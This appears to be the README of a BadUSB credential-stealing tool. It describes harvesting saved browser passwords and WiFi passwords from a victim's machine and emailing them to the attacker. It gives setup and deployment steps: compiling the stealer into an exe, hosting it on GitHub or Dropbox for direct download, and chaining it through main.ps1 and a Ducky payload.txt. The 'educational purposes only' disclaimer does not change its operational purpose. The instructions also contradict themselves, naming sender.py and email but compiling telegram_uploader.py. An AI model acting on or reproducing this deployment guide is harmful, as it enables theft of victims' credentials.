# Simple Password Stealer

## Disclaimer
This script was created and is intended for **educational purposes only**!

## Description
Simple Password Stealer is designed to work with USB devices like the USB RUBBER DUCKY, USB NOVA, or any BadUSB device. It is capable of extracting saved passwords from all browsers installed on a victim's device. Additionally, it retrieves passwords for known WiFi networks and subsequently transmits the data via email.

## Prerequisites
Before running the script, ensure you have the following:

- A Gmail address for both the sender and recipient.
- A password for the application, which can be generated using Google's guide: [App Passwords](https://support.google.com/mail/answer/185833?hl=en).

## Installation
To prepare the script for execution, follow these steps:

1. **Edit the sender.py file**:
   - Insert the Gmail addresses of the sender and recipient.
   
2. **Convert the script into an executable**:
   - Install PyInstaller via pip:
     ```
     pip install pyinstaller
     ```
   - Generate an exe file:
     ```
     pyinstaller --onefile -w telegram_uploader.py
     ```

## Deployment
1. **Add the executable file to a public hosting**:
   - The exe file should be uploaded to a public GitHub repository or Dropbox.
   - Ensure the Dropbox link ends with "?dl=1" for direct downloading.

2. **Integrate with main script**:
   - Place the link to the executable file in the `main.ps1` script.
   - Share the `main.ps1` script appropriately.

3. **Configure the payload**:
   - The link to `main.ps1` should be embedded in the `payload.txt` file.

## Remember
Always use this script responsibly and within the bounds of the law. Unauthorized access to computer systems is illegal and unethical.
